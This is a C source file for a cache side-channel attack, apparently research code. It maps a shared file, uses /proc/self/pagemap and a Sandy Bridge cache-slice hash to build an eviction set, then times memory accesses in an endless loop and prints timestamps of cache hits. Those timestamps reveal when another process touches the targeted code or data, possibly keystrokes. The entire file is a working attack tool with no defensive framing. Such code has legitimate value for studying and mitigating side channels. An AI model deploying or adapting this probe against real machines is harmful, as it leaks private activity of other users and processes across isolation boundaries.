#define _GNU_SOURCE
#include <pthread.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <sys/shm.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <stdint.h>
#include "../cacheutils.h"

size_t start = 0;
size_t keystate = 0;
size_t kpause = -1ULL;

uint8_t eviction[64*1024*1024];
uint8_t* eviction_ptr;

int pagemap = -1;

uint64_t GetPageFrameNumber(int pagemap, uint8_t* virtual_address) {
  // Read the entry in the pagemap.
  uint64_t value;
  int got = pread(pagemap, &value, 8,(((uintptr_t)virtual_address) / 0x1000) * 8);
  assert(got == 8);
  uint64_t page_frame_number = value & ((1ULL << 54)-1);
  return page_frame_number;
}

int get_cache_slice(uint64_t phys_addr, int bad_bit) {
 static const int h0[] = { 6, 10, 12, 14, 16, 17, 18, 20, 22, 24, 25, 26, 27, 28, 30, 32, 33, 35, 36 };
  static const int h1[] = { 7, 11, 13, 15, 17, 19, 20, 21, 22, 23, 24, 26, 28, 29, 31, 33, 34, 35, 37 };

  int count = sizeof(h0) / sizeof(h0[0]);
  int hash = 0;
  for (int i = 0; i < count; i++) {
    hash ^= (phys_addr >> h0[i]) & 1;
  }
  count = sizeof(h1) / sizeof(h1[0]);
  int hash1 = 0;
  for (int i = 0; i < count; i++) {
    hash1 ^= (phys_addr >> h1[i]) & 1;
  }
  return hash1 << 1 | hash;
}

int in_same_cache_set(uint64_t phys1, uint64_t phys2, int bad_bit) {
  // For Sandy Bridge, the bottom 17 bits determine the cache set
  // within the cache slice (or the location within a cache line).
  uint64_t mask = ((uint64_t) 1 << 17) - 1;
  return ((phys1 & mask) == (phys2 & mask) &&
          get_cache_slice(phys1, bad_bit) == get_cache_slice(phys2, bad_bit));
}

int g_pagemap_fd = -1;

// Extract the physical page number from a Linux /proc/PID/pagemap entry.
uint64_t frame_number_from_pagemap(uint64_t value) {
  return value & ((1ULL << 54) - 1);
}

void init_pagemap() {
  g_pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
  assert(g_pagemap_fd >= 0);
}

uint64_t get_physical_addr(uint64_t virtual_addr) {
  uint64_t value;
  off_t offset = (virtual_addr / 4096) * sizeof(value);
  int got = pread(g_pagemap_fd, &value, sizeof(value), offset);
  assert(got == 8);

  // Check the "page present" flag.
  assert(value & (1ULL << 63));

  uint64_t frame_num = frame_number_from_pagemap(value);
  return (frame_num * 4096) | (virtual_addr & (4095));
}

#define ADDR_COUNT 1024

volatile uint64_t* faddrs[ADDR_COUNT];
#define PROBE_COUNT 9
int found = 1;

void pick(volatile uint64_t** addrs, int step)
{
  uint8_t* buf = (uint8_t*) addrs[0];
  uint64_t phys1 = get_physical_addr((uint64_t)buf);
//  printf("%zx -> %zx\n",(uint64_t) buf, phys1);
  for (size_t i = 0; i < 64*1024*1024-4096; i += 4096) {
    uint64_t phys2 = get_physical_addr((uint64_t)(eviction_ptr + i));
    if (phys1 != phys2 && in_same_cache_set(phys1, phys2, -1)) {
      addrs[found] = (uint64_t*)(eviction_ptr+i);
//      printf("%zx -> %zx\n",(uint64_t) eviction_ptr+i, phys2);
      found++;
    }
  }
  fflush(stdout);
}

size_t rev = 0;
size_t kcount = 0;
void flushandreload(void* addr)
{
size_t time,delta;
if (rev == 0)
{
  time = rdtsc();
  for (size_t i = 1; i < PROBE_COUNT; ++i)
  {
    *faddrs[i];
    *faddrs[i+1];
    *faddrs[i+2];
    *faddrs[i];
    *faddrs[i+1];
    *faddrs[i+2];
  }
  delta = rdtsc() - time;
  rev = 1;
}
else
{
  time = rdtsc();
  for (size_t i = PROBE_COUNT-1; i > 0; --i)
  {
    *faddrs[i+2];
    *faddrs[i+1];
    *faddrs[i];
    *faddrs[i+2];
    *faddrs[i+1];
    *faddrs[i];
  }
  delta = rdtsc() - time;
  rev = 0;
}
  if (delta > 230)
  {
    kcount++;
    if (kcount > 3)
    {
      printf("Cache Hit (%zu) after %10lu cycles, t=%10lu us\n", delta, kpause, (time-start)/2600);
    }
    kpause = 0;
  }
  else
  {
    kpause++;
    kcount = 0;
  }
}

int main(int argc, char** argv)
{
  char* name = argv[1];
  char* offsetp = argv[2];
  if (argc != 3)
    return 1;
  unsigned int offset = 0;
  !sscanf(offsetp,"%x",&offset);
  int fd = open(name,O_RDONLY);
  if (fd < 3)
    return 2;
  unsigned char* addr = (unsigned char*)mmap(0, 64*1024*1024, PROT_READ, MAP_SHARED, fd, 0);
  if (addr == (void*)-1)
    return 3;
  faddrs[0] = (uint64_t*) addr;
  maccess(addr);
  printf("init\n");
  for (size_t i = 0; i < 64*1024*1024; ++i)
    eviction[i] = i;
  eviction_ptr = (uint8_t*)(((size_t)eviction & ~0xFFF) | ((size_t)faddrs[0] & 0xFFF));
  printf("init pm\n");
  init_pagemap();
  printf("eviction set\n");
  pick(faddrs,+1);
  printf("eviction set size = %zu\n", found);
  printf("start\n");
  start = rdtsc();
  while(1)
  {
    flushandreload(addr + offset);
    for (int i = 0; i < 3000; ++i)
      sched_yield();
  }
  return 0;
}
